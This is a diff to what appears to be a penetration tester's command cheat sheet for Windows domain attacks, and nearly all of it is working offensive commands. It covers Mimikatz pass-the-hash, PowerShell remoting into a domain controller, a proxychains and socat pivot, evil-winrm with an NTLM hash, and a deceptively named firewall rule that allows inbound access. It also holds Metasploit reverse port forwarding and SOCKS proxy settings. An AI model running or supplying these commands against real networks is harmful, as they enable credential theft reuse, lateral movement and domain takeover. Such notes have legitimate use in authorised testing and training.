@@ -20,7 +20,12 @@ sekurlsa::pth /user:user /domain:domain /ntlm:REDACTED /run:powershell
 PS C:\Windows\system32> Enter-PSSession -ComputerName ip
 PS C:\Users\user\Documents> hostname; whoami 
 dc-1 
-cyber\n.glover
+domain\user
+
+PowerShell Remoting:
+udo proxychains socat TCP4-Listen:5985,fork TCP:10.10.120.1:5985
+
+#proxychains evil-winrm -u n.glover -H REDACTED -i 10.10.120.1
 
 METASPLOIT
 msfconsole -q
@@ -32,6 +37,9 @@ netsh advfirewall firewall add rule name="Totally Legit Rule" dir=in action=allo
 Metasploit
 sessions 1
 portfwd add -R -p 8080 -l 80 -L ip
+
+#metasploit
+setg Proxies socks4:127.0.0.1:1080
 
 
 
